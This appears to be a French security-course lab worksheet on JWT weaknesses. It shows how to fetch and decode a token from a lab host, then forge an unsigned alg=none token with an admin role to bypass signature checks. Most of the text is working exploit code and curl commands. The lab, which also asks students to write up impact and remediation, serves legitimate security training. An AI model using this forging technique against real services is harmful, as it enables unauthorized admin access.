# TP4 — JWT : analyse et bypass contrôlé

## Objectif

Comprendre le format JWT et tester une mauvaise validation de signature dans le lab.

## Étape 1 — Obtenir un JWT

```bash
TOKEN=$(curl -s -X POST http://authapi.target.local:5001/jwt-login \
  -d "username=alice&password=alice123" | jq -r .token)

echo "$TOKEN"
```

## Étape 2 — Décoder le JWT localement

```bash
python3 - << 'PY'
import os, base64, json
token=os.environ.get("TOKEN")
h,p,s=token.split(".")
def dec(x):
    x += "=" * (-len(x) % 4)
    return json.loads(base64.urlsafe_b64decode(x))
print("HEADER:", dec(h))
print("PAYLOAD:", dec(p))
print("SIGNATURE:", s[:20] + "...")
PY
```

Si la variable n’est pas disponible :

```bash
export TOKEN="COLLER_LE_TOKEN_ICI"
```

## Étape 3 — Tester l’accès admin

```bash
curl -H "Authorization: Bearer $TOKEN" http://authapi.target.local:5001/api/jwt/admin | jq
```

Résultat attendu : refus.

## Étape 4 — Créer un JWT alg=none avec rôle admin

```bash
python3 - << 'PY'
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data,separators=(",",":")).encode()).rstrip(b"=").decode()
header={"typ":"JWT","alg":"none"}
payload={"sub":"1","username":"alice","role":"admin","iat":1234567890}
print(b64url(header)+"."+b64url(payload)+".")
PY
```

Copier le token généré :

```bash
export BADTOKEN="COLLER_TOKEN_ICI"
curl -H "Authorization: Bearer $BADTOKEN" http://authapi.target.local:5001/api/jwt/admin | jq
```

## À documenter

- header original ;
- payload original ;
- modification ;
- résultat ;
- impact ;
- remédiation.

## Livrable

```bash
cp ../livrables-templates/04-jwt.md livrables/04-jwt.md
```
